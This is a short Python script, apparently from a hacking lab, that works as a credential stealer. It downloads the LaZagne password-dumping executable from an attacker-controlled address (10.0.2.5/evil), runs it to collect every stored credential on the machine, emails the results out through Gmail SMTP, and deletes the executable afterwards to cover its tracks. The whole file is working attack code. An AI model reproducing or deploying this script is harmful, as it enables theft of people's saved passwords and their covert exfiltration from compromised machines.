import requests
import subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://10.0.2.5/evil/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell = True).decode('cp866')
send_mail("mail@mail.com", "password", result.encode('utf-8'))

os.remove("lazagne.exe")